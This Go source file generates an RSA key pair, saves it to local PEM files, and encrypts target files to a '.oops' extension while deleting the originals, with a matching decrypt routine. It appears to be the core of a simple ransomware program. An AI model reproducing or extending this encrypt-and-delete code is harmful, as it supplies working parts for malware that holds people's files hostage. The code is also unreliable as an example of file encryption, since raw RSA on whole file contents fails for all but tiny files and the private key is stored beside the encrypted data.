package crypto

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
)

const (
	PrivateKeyPath = "private.pem"
	PublicKeyPath  = "public.pem"
)

func keysExist() bool {
	if _, err := os.Stat("private.pem"); os.IsNotExist(err) {
		return false
	}
	if _, err := os.Stat("public.pem"); os.IsNotExist(err) {
		return false
	}
	return true
}

func GenerateKeyPair(bits int) error {
	// @todo: check if keys exist, if so, log to stdout and return nil
	if keysExist() {
		fmt.Println("Keys already exist, continuing...")
		return nil
	}
	privateKey, err := rsa.GenerateKey(rand.Reader, bits)
	if err != nil {
		return err
	}

	publicKey := &privateKey.PublicKey

	return savePEMKey(PrivateKeyPath, privateKey, PublicKeyPath, publicKey)
}

func savePEMKey(privatePath string, privateKey *rsa.PrivateKey, publicPath string, publicKey *rsa.PublicKey) error {
	privateFile, err := os.Create(privatePath)
	if err != nil {
		return err
	}
	defer privateFile.Close()

	privateBlock := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
	}

	if err := pem.Encode(privateFile, privateBlock); err != nil {
		return err
	}

	publicFile, err := os.Create(publicPath)
	if err != nil {
		return err
	}
	defer publicFile.Close()

	pubASN1, err := x509.MarshalPKIXPublicKey(publicKey)
	if err != nil {
		return err
	}

	publicBlock := &pem.Block{
		Type:  "RSA PUBLIC KEY",
		Bytes: pubASN1,
	}

	if err := pem.Encode(publicFile, publicBlock); err != nil {
		return err
	}

	return nil
}

func LoadPublicKey(filename string) (*rsa.PublicKey, error) {
	publicKeyFile, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open public key file: %w", err)
	}

	// debug
	// fmt.Printf("Public Key File Contents:\n%s\n", publicKeyFile)

	// pem.Decode does not return an error as a second return value
	// returns the 'rest' data after the PEM block
	block, rest := pem.Decode(publicKeyFile)
	if block == nil || len(rest) > 0 {
		fmt.Printf("PEM decoding failed. Remaining data: %s", string(rest))
		return nil, errors.New("failed to decode PEM block containing public key")
	}

	publicKeyInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("failed to parse public key: %w", err)
	}

	publicKey, ok := publicKeyInterface.(*rsa.PublicKey)
	if !ok {
		return nil, errors.New("not RSA public key")
	}

	return publicKey, nil
}

func LoadPrivateKey(filename string) (*rsa.PrivateKey, error) {
	privateKeyFile, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open private key file: %w", err)
	}

	// Let's print the contents of the private key file
	// fmt.Printf("Private Key File Contents:\n%s\n", privateKeyFile)

	// pem.Decode does not return an error as a second return value
	block, rest := pem.Decode(privateKeyFile)
	if block == nil || len(rest) > 0 {
		fmt.Printf("PEM decoding failed. Remaining data: %s", string(rest))
		return nil, errors.New("failed to decode PEM block containing private key")
	}
	if block.Type != "RSA PRIVATE KEY" {
		return nil, fmt.Errorf("unexpected key type: %s", block.Type)
	}

	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("failed to parse private key: %w", err)
	}

	return privateKey, nil
}

func EncryptFile(filename string, publicKey *rsa.PublicKey) error {
	fmt.Printf("🔐 Encrypting file=%s\n", filename)

	// Read the file
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("error reading file: %v", err)
	}

	// Encrypt the content
	encryptedContent, err := rsa.EncryptPKCS1v15(rand.Reader, publicKey, content)
	if err != nil {
		return fmt.Errorf("error encrypting content: %v", err)
	}

	// Write the encrypted content back into a new file with .oops extension
	err = ioutil.WriteFile(filename+".oops", encryptedContent, 0644)
	if err != nil {
		return fmt.Errorf("error writing encrypted content: %v", err)
	}

	// Delete the original file
	err = os.Remove(filename)
	if err != nil {
		return fmt.Errorf("error deleting original file: %v", err)
	}

	return nil
}

func DecryptFile(filename string, privateKey *rsa.PrivateKey) error {
	fmt.Printf("🔓 Decrypting file=%s\n", filename)

	// Read the encrypted file
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("error reading encrypted file: %v", err)
	}

	// Decrypt the content
	decryptedContent, err := rsa.DecryptPKCS1v15(rand.Reader, privateKey, content)
	if err != nil {
		return fmt.Errorf("error decrypting content: %v", err)
	}

	// Write the decrypted content back into a new file, removing the .oops extension
	newFilename := strings.TrimSuffix(filename, ".oops")
	err = ioutil.WriteFile(newFilename, decryptedContent, 0644)
	if err != nil {
		return fmt.Errorf("error writing decrypted content: %v", err)
	}

	// Delete the encrypted file
	err = os.Remove(filename)
	if err != nil {
		return fmt.Errorf("error deleting encrypted file: %v", err)
	}

	return nil
}
